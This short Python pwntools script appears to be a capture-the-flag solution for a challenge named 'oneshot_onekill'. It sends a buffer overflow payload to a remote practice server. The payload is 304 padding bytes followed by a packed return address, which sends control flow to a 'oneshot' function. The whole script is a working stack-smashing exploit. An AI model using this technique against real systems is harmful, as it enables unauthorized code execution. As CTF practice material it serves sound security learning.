from pwn import *

# p = process('oneshot_onekill')
p = remote('prob.vulnerable.kr', 20026)

oneshot = 0x80485a5

p.sendline('A' * 300 + 'A' * 4 + p32(oneshot))
print p.recvall()